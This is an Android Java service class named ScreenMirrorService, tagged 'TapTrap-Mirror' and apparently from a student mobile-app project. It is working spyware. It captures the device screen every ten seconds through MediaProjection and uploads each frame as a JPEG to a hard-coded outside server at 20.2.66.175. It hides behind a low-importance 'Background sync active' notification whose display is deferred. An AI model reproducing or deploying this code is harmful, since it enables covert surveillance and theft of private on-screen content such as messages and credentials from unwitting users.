package com.example.inf2007_mad_j1847.test;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;

import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.ByteBuffer;

public class ScreenMirrorService extends Service {

    private static final String TAG = "TapTrap-Mirror";
    private static final String SERVER_URL = "http://20.2.66.175:9090/upload";
    private static final int INTERVAL_MS = 10000; // 10 seconds
    private static final String CHANNEL_ID = "screen_mirror";

    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private Handler handler;
    private boolean isRunning = false;

    // Static result code and data from MediaProjection permission
    public static int sResultCode;
    public static Intent sResultData;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // ✅ new — explicitly pass the type
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
            startForeground(1, buildNotification(),
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
        } else {
            startForeground(1, buildNotification());
        }

        handler = new Handler(Looper.getMainLooper());

        // ✅ Use static fields directly instead of intent extras
        if (sResultCode == 0 || sResultData == null) {
            Log.e(TAG, "❌ No MediaProjection token!");
            stopSelf();
            return START_NOT_STICKY;
        }

        MediaProjectionManager mpm = (MediaProjectionManager)
                getSystemService(Context.MEDIA_PROJECTION_SERVICE);

        mediaProjection = mpm.getMediaProjection(sResultCode, sResultData);

        if (mediaProjection == null) {
            Log.e(TAG, "❌ MediaProjection is null!");
            stopSelf();
            return START_NOT_STICKY;
        }

        setupVirtualDisplay();
        isRunning = true;
        scheduleScreenshot();

        Log.d(TAG, "🎥 Screen mirror service started!");
        return START_STICKY;
    }

    private void setupVirtualDisplay() {
        DisplayMetrics metrics = new DisplayMetrics();
        WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        wm.getDefaultDisplay().getMetrics(metrics);

        int width = metrics.widthPixels;
        int height = metrics.heightPixels;
        int dpi = metrics.densityDpi;

        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);

        // ✅ Register callback BEFORE createVirtualDisplay (required on API 34)
        mediaProjection.registerCallback(new MediaProjection.Callback() {
            @Override
            public void onStop() {
                Log.d(TAG, "🛑 MediaProjection stopped");
                isRunning = false;
                if (virtualDisplay != null) virtualDisplay.release();
            }
        }, handler);

        virtualDisplay = mediaProjection.createVirtualDisplay(
                "TapTrapMirror",
                width, height, dpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader.getSurface(),
                null, null
        );
    }

    private void scheduleScreenshot() {
        handler.postDelayed(() -> {
            if (isRunning) {
                captureAndUpload();
                scheduleScreenshot(); // schedule next one
            }
        }, INTERVAL_MS);
    }

    private void captureAndUpload() {
        new Thread(() -> {
            try {
                Image image = imageReader.acquireLatestImage();
                if (image == null) {
                    Log.d(TAG, "No image available yet");
                    return;
                }

                // Convert image to bitmap
                Image.Plane[] planes = image.getPlanes();
                ByteBuffer buffer = planes[0].getBuffer();
                int width = image.getWidth();
                int height = image.getHeight();
                int pixelStride = planes[0].getPixelStride();
                int rowStride = planes[0].getRowStride();
                int rowPadding = rowStride - pixelStride * width;

                Bitmap bitmap = Bitmap.createBitmap(
                        width + rowPadding / pixelStride,
                        height,
                        Bitmap.Config.ARGB_8888
                );
                bitmap.copyPixelsFromBuffer(buffer);
                image.close();

                // Compress to JPEG
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                bitmap.compress(Bitmap.CompressFormat.JPEG, 70, baos);
                byte[] jpegData = baos.toByteArray();
                bitmap.recycle();

                // Upload to server
                URL url = new URL(SERVER_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "image/jpeg");
                conn.setRequestProperty("Content-Length", String.valueOf(jpegData.length));

                OutputStream os = conn.getOutputStream();
                os.write(jpegData);
                os.flush();
                os.close();

                int responseCode = conn.getResponseCode();
                Log.d(TAG, "📸 Screenshot uploaded! Response: " + responseCode);
                conn.disconnect();

            } catch (Exception e) {
                Log.e(TAG, "Screenshot failed: " + e.getMessage());
            }
        }).start();
    }

    private Notification buildNotification() {
        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID, "Screen Mirror", NotificationManager.IMPORTANCE_LOW);
        nm.createNotificationChannel(channel);

        Notification.Builder builder = new Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("Syncing...")
                .setContentText("Background sync active")
                .setSmallIcon(android.R.drawable.ic_dialog_info);

        // ✅ Wrap in if block to satisfy compiler
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) {
            builder.setForegroundServiceBehavior(Notification.FOREGROUND_SERVICE_DEFERRED);
        }

        return builder.build();
    }

    @Override
    public void onDestroy() {
        isRunning = false;
        if (virtualDisplay != null) virtualDisplay.release();
        if (mediaProjection != null) mediaProjection.stop();
        if (handler != null) handler.removeCallbacksAndMessages(null);
        Log.d(TAG, "🛑 Screen mirror stopped");
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}